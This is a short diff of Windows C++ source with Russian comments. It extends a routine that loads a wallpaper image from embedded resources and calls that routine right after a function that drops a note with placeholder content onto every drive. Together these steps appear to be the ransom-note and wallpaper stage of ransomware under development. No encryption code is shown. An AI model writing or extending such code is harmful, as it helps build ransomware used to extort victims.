@@ -185,10 +185,20 @@ std::vector<std::string> split_string(const std::string& str, char delimiter) {
 }
 
 // ============================================================
-// УСТАНОВКА ОБОЕВ ИЗ РЕСУРСОВ
+// УСТАНОВКА ОБОЕВ ИЗ РЕСУРСОВ (НЕ BASE64!)
 // ============================================================
 void set_wallpaper_from_resource() {
+    // Пробуем разные типы ресурсов
     HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "IMAGE");
+    if (!hRes) {
+        hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "JPEG");
+    }
+    if (!hRes) {
+        hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "PNG");
+    }
+    if (!hRes) {
+        hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "BMP");
+    }
     if (!hRes) return;
     
     HGLOBAL hData = LoadResource(NULL, hRes);
@@ -427,6 +437,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::string note_content = NOTE_CONTENT_PLACEHOLDER;
     drop_notes(drives, exclude_folders, note_name, note_content);
     
+    // Обои из ресурсов (НЕ BASE64!)
     set_wallpaper_from_resource();
     
     return 0;
